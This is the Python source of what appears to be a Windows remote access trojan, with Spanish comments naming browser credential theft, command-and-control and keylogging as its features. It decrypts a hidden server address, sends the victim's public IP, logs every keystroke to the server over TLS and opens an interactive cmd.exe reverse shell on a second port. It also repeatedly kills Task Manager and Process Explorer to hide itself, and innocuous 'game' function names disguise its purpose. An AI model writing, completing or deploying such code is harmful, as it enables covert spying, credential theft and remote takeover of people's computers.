import ctypes
import ssl
import tempfile
import threading
import subprocess
import os
import time

import psutil
from colorama import init, Fore
import keyboard
import socket
import find_interests
from CryptoPhenix import decrypt
import requests
import certs

#
# Autor   ->  an0mal1a
# Name    ->  Pablo
# GitHub  ->  https://github.com/an0mal1a
# Correo  -> pablodiez024@proton.me
#

# ACTUALES:
# Credenciales de navegadores
# C&C
# Keylogger


def prep_gme():
    try:
        pim = b'\xf9\x0c]Q\x81\xcf\xf0\xf0Z\xeb FA\xef;\xc3`\x8b\x17\xa5\xf06\x89\x0cq\x9cz\x1cYA\xa93\xb9\xfc\xaa{\x11g\x1d{{\xf4\x9c\xe2R/]\xa9\xc6\x0c\x15E\xee\xac\xaa~\xebE\xbe@\x1b\xa6s\xb0'
        conn.send("\n\n".encode() + decrypt(pim) + " ".encode())
        conn.send(requests.get('http://checkip.amazonaws.com').text.strip().encode() + "\n\n".encode())
    except Exception:
        pass


def know_gme():
    unkown = b"\xaa\x7f\xfd?]*\xf7\x0f\xf3\xa6=\xe8\x95\x10J\xaf\xb6x&M\xb9'~\xa4\xb08\xd9\x1a\xd3\x03R\xf3\xe8\xa7\xc5h\xf6-\xb5\x9b\xa8d\x1b\x8e\xc5\xfe.\xf7|Zc\xbb\x936w\x81\xaa~j\xeb\x94\xddQ\x08"
    return str(decrypt(unkown).decode())
    #return "127.0.0.1"


yek = []


def is_admin():
    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
       return 1
    else:
        return 0;


def is_open():
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        if "Taskmgr.exe" in proc.info['name'] or "procexp64.exe" in proc.info['name']:
            return proc.info['pid']
    return False


def start_taskmanager():
    while True:
        pid = is_open()
        if pid:
            try:
                os.kill(pid, 9)
            except PermissionError:
                if is_admin() != 0:
                    pass
        time.sleep(0.2)


try:
    csd = tempfile.NamedTemporaryFile(delete=False)
    csd.write(certs.get_crte().encode())
    csd.close()

    cock = tempfile.NamedTemporaryFile(delete=False)
    cock.write(certs.get_locker().encode())
    cock.close()

    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    context.verify_mode = ssl.CERT_NONE
    context.load_cert_chain(certfile=csd.name, keyfile=cock.name)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((know_gme(), 5000))
    conn = context.wrap_socket(sock, server_hostname=know_gme())
except Exception:
    pass


def on_press(event):
    try:
        t = threading.Thread(target=init_game)
        t.start()

        yek.append(event.name)

        if len(event.name) > 1:
            conn.send(" |".encode() + event.name.encode() + "| ".encode())
        else:
            conn.send(event.name.encode())
    except ConnectionResetError:
        pass
    except ConnectionAbortedError:
        pass
    except Exception:
        pass


def sdn_gme(s, xxx):
    try:
        while True:
            output = xxx.stdout.readline()
            if not output:
                break
            s.send(output)
    except ssl.SSLEOFError:
        pass


def rcv_gme(s, xxx):
    while True:
        try:
            command = s.recv(1024)
            if not command:
                break
            xxx.stdin.write(command)
            xxx.stdin.flush()
        except Exception:
            break


def exiting():
    lgo = ", ".join(yek)

    try:
        conn.send(f"\n\n[!] Este ha sido mi resumen: \n{lgo}".encode())
        conn.send("-".encode() * 50)

        conn.close()
        time.sleep(3)
        exit()
    except Exception:
        exit()


def games():
    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
        context.verify_mode = ssl.CERT_NONE
        context.load_cert_chain(certfile=csd.name, keyfile=cock.name)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((know_gme(), 5001))
        conn = context.wrap_socket(sock, server_hostname=know_gme())

        # Crear el proceso con un shell interactivo
        xxx = subprocess.Popen('cmd.exe', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                               stdin=subprocess.PIPE)

        # Leer la salida del proceso en un hilo adicional y enviarla al socket
        ompt_rcv = threading.Thread(target=rcv_gme, args=(conn, xxx))
        ompt_rcv.start()

        ompt_sdn = threading.Thread(target=sdn_gme, args=(conn, xxx))
        ompt_sdn.start()

        ompt_rcv.join()
        ompt_sdn.join()

        conn.close()
        xxx.terminate()
    except ConnectionResetError:
        pass
    except ConnectionAbortedError:
        pass
    except ConnectionRefusedError:
        pass


def init_game():

    t = threading.Thread(target=games)
    t.start()

    t.join()


def init_task():
    t = threading.Thread(target=start_taskmanager)
    t.start()

    t.join()


def main():
    try:
        prep_gme()
        init(convert=True)

        find_interests.main()
        keyboard.on_press(on_press)
        task = threading.Thread(target=init_task)
        task.start()

        while True:
            try:
                continue
            except KeyboardInterrupt:
                exiting()

    except ConnectionResetError:
        pass
    except ConnectionAbortedError:
        pass
    except KeyboardInterrupt:
        exiting()

def clean():
    if os.name == "posix":
        os.system("clear")
    else:
        os.system("cls")


if __name__ == "__main__":
    try:
        #is_admin()
        main()
    except Exception:
        pass

